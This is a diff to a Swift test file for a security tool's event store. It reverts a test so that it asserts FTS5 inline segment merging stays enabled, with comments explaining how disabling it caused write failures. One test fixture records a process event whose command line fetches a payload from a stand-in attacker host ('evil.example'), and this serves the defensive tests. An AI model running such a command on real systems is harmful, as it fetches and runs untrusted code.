@@ -1,6 +1,8 @@
 // EventStoreFTSMergeTests.swift
-// v1.21.4 Tier-A per-event CPU optimization — FTS5 automerge deferred off
-// the hot insert path; explicit off-path ('merge', N) crank.
+// v1.21.4 Tier-A per-event CPU optimization — explicit off-path
+// ('merge', N) crank. The companion automerge=0 deferral was REVERTED in
+// v1.21.6-rc.35 after it drove events_fts into its segment ceiling on an
+// installed host; the off-path crank itself is retained and still covered.
 //
 // These pin the DETECTION-SAFETY contract of the change:
 //   - events_fts is read ONLY by search() (threat hunting). Deferring the
@@ -8,8 +10,9 @@
 //     off-path must NOT change which rows a MATCH returns.
 //   - search() must find inserted events both BEFORE and AFTER an explicit
 //     merge, with identical results.
-//   - The automerge=0 deferral must actually be applied (persisted in the
-//     FTS5 %_config shadow table).
+//   - Inline segment merging must remain ENABLED (rc.35). The original
+//     automerge=0 deferral is what let events_fts reach FTS5's hard 2000-
+//     segment ceiling, at which every write fails SQLITE_FULL.
 //   - mergeFTS() succeeds on a writable store and no-ops on a read-only one.
 
 import Testing
@@ -125,8 +128,19 @@ struct EventStoreFTSMergeTests {
 
     // MARK: - Tests
 
-    @Test("automerge is disabled in the FTS5 %_config shadow table")
-    func automergeConfiguredToZero() async throws {
+    @Test("inline segment merging stays enabled in the FTS5 %_config shadow table")
+    func automergeRemainsEnabled() async throws {
+        // v1.21.6-rc.35: this test previously asserted `automerge == 0`, pinning
+        // the v1.21.4 deferral. That deferral is what allowed `events_fts` to
+        // walk into FTS5's hard 2000-segment ceiling: with no inline merging,
+        // segments accrue at roughly one per two rows, and on an installed host
+        // ingestion drove 1165 -> 1999 segments in about 30 seconds — far faster
+        // than the off-path merge this optimisation relied on. At the ceiling
+        // every write fails SQLITE_FULL, so persistence stalled and roughly a
+        // thousand events were dropped per cycle.
+        //
+        // The off-path `mergeFTS()` crank below is still valuable and still
+        // tested; it just cannot be the ONLY thing bounding segment count.
         let path = Self.tempPath()
         defer { try? FileManager.default.removeItem(atPath: path) }
         let store = try EventStore(path: path)
@@ -135,7 +149,10 @@ struct EventStoreFTSMergeTests {
             name: "curl", path: "/usr/bin/curl",
             commandLine: "curl https://evil.example/payload"
         ))
-        #expect(Self.readAutomergeConfig(at: path) == 0)
+        #expect(
+            Self.readAutomergeConfig(at: path) != 0,
+            "automerge is disabled again; segment growth is unbounded during writes"
+        )
     }
 
     @Test("search() finds inserted events BEFORE any explicit merge")
